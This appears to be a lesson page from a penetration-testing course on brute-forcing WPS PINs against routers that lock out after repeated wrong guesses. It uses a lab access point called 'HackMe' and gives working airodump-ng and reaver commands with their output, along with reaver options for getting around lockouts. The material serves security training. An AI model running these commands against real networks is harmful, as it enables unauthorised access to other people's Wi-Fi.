---
title: Secured Access Points
description: Secured Access Points
date: '2026-09-21'
tags: []
published: true
slug: secured-access-points
category: wifi
folder: online-bruteforcing
order: 30
---
# Secured Access Points

## What's Changed?

Old-school WPS brute-forcing used to work great — just guess PINs until you find the right one. But vendors caught on, and modern routers now **lock up** after too many wrong guesses.

**Typical lockout behavior:**

- After **3 wrong attempts** → locks for **60 seconds**
- After **10 wrong attempts** → locks for **365 days** (basically permanent)

This makes traditional brute-forcing much harder — sometimes impossible — against modern, well-configured routers.

---

## Step 1: Set Up Monitor Mode

Same setup as before, using `iw` to avoid Reaver compatibility issues:

```shellsession
iccys@htb[/htb]$ iw dev wlan0 interface add mon0 type monitor

iccys@htb[/htb]$ ifconfig mon0 up

iccys@htb[/htb]$ iwconfig

lo        no wireless extensions.

eth0      no wireless extensions.

mon0      IEEE 802.11  Mode:Monitor  Tx-Power=20 dBm   
          Retry short limit:7   RTS thr:off   Fragment thr:off
          Power Management:on
          
wlan0     IEEE 802.11  ESSID:off/any  
          Mode:Managed  Access Point: Not-Associated   Tx-Power=20 dBm   
          Retry short limit:7   RTS thr:off   Fragment thr:off
          Encryption key:off
          Power Management:on
```

---

## Step 2: Watch the WPS Status Live

Keep an eye on the target's WPS status using airodump-ng:

```shellsession
iccys@htb[/htb]$ airodump-ng mon0 --wps -c 1


 CH  1 ][ Elapsed: 1 min ][ 2024-07-01 19:51 

 BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH WPS                ESSID

 86:53:10:C3:1B:26  -28      555        0    0   1   54   WPA2 CCMP   PSK  2.0 LAB,DISP,KPAD  HackMe          
```

---

## Step 3: Start Brute-Forcing (In a Second Terminal)

```shellsession
iccys@htb[/htb]$ reaver -i mon0 -c 1 -b 86:53:10:C3:1B:26 -v

Reaver v1.6.5 WiFi Protected Setup Attack Tool
Copyright (c) 2011, Tactical Network Solutions, Craig Heffner <cheffner@tacnetsol.com>

[+] Waiting for beacon from 86:53:10:C3:1B:26
[+] Received beacon from 86:53:10:C3:1B:26
[+] Trying pin "12345670"
[!] Found packet with bad FCS, skipping...
[+] Associated with 86:53:10:C3:1B:26 (ESSID: HackMe)
[+] Trying pin "00005678"
[+] Associated with 86:53:10:C3:1B:26 (ESSID: HackMe)
[+] Trying pin "01235678"
[+] Associated with 86:53:10:C3:1B:26 (ESSID: HackMe)

[!] WARNING: Detected AP rate limiting, waiting 60 seconds before re-checking
```

**What just happened:** After 3 wrong guesses, the router triggered its lockout. Reaver detects this and automatically pauses for 60 seconds before trying again.

---

## Step 4: Confirm the Lockout in Airodump-ng

You can actually see the lock happen live:

```shellsession
iccys@htb[/htb]$ airodump-ng mon0 --wps -c 1


 CH  1 ][ Elapsed: 48 s ][ 2024-07-01 19:52 

 BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH WPS                ESSID

 86:53:10:C3:1B:26  -28   0      483       33    0   1   54   WPA2 CCMP   PSK Locked              HackMe  
```

Notice the WPS column now says **"Locked"** instead of a version number.

---

## Fine-Tuning Reaver for Locked Routers

If a vendor's lockout system is weak or inconsistent, you might still be able to keep brute-forcing by adjusting Reaver's timing:

|Option|What It Does|
|---|---|
|`-L`, `--ignore-locks`|Ignore the router's reported "locked" status|
|`-N`, `--no-nacks`|Don't send NACK messages for out-of-order packets|
|`-d`, `--delay=<seconds>`|Set delay between each PIN attempt|
|`-T`, `--m57-timeout=<seconds>`|Set the timeout for M5/M7 messages|
|`-r`, `--recurring-delay=<x:y>`|Sleep for y seconds every x attempts|

---

## The Nightmare Scenario: Permanent Lockout

On stricter, modern routers, hitting the **10th wrong guess** triggers a lockout that lasts **365 days** — effectively ending your attack for good:

```shellsession
iccys@htb[/htb]$ reaver -i mon0 -c 1 -b 86:53:10:C3:1B:26 -v

Reaver v1.6.5 WiFi Protected Setup Attack Tool
Copyright (c) 2011, Tactical Network Solutions, Craig Heffner <cheffner@tacnetsol.com>
<SNIP>
[+] Trying pin "77775672"
[+] Associated with 86:53:10:C3:1B:26 (ESSID: HackMe)
[!] WARNING: Detected AP rate limiting, waiting 60 seconds before re-checking
[!] WARNING: Detected AP rate limiting, waiting 60 seconds before re-checking
[!] WARNING: Detected AP rate limiting, waiting 60 seconds before re-checking
[!] WARNING: Detected AP rate limiting, waiting 60 seconds before re-checking
[!] WARNING: Detected AP rate limiting, waiting 60 seconds before re-checking
[!] WARNING: Detected AP rate limiting, waiting 60 seconds before re-checking
[!] WARNING: Detected AP rate limiting, waiting 60 seconds before re-checking
[!] WARNING: Detected AP rate limiting, waiting 60 seconds before re-checking
[!] WARNING: Detected AP rate limiting, waiting 60 seconds before re-checking
[!] WARNING: Detected AP rate limiting, waiting 60 seconds before re-checking
[!] WARNING: Detected AP rate limiting, waiting 60 seconds before re-checking
[!] WARNING: Detected AP rate limiting, waiting 60 seconds before re-checking
[!] WARNING: Detected AP rate limiting, waiting 60 seconds before re-checking
```

This endless stream of "rate limiting" warnings is a sign it's truly locked out — no amount of waiting will fix this one.

---

## Key Questions Before Attacking a Locked Router

Before wasting time (or permanently locking yourself out), ask:

1. **Does it lock after just 3 wrong attempts?**
2. **How long does the lock last?** (varies a lot by vendor)
3. **Can I narrow down the guesses first?** (using PIN generation algorithms — covered next)

📝 **Good news:** Sometimes you get lucky and crack the PIN within the first 10 guesses, before a permanent lockout kicks in. Doing your homework on the router's vendor and behavior beforehand dramatically improves your odds.

---

## Command Summary

```bash
iw dev wlan0 interface add mon0 type monitor      # Create a new monitor-mode interface named mon0
ifconfig mon0 up                                  # Turn on the new interface
airodump-ng mon0 --wps -c 1                       # Watch WPS status (including lock state) on channel 1
reaver -i mon0 -c 1 -b <BSSID> -v                 # Start brute-forcing with verbose output
```

**What each argument means:**

|Argument|Meaning|
|---|---|
|`interface add mon0 type monitor`|Creates a new interface (`mon0`) set to monitor mode|
|`-i mon0`|Use the `mon0` interface|
|`-c 1`|Target channel 1|
|`-b <BSSID>`|Target router's MAC address|
|`-v`|Verbose output (see each PIN attempt as it happens)|
|`-L` / `--ignore-locks`|Ignore the router's reported lock state|
|`-N` / `--no-nacks`|Skip sending NACKs for out-of-order packets|
|`-d <seconds>`|Delay between PIN attempts|
|`-T <seconds>`|Timeout for M5/M7 messages|
|`-r <x:y>`|Sleep y seconds every x attempts|
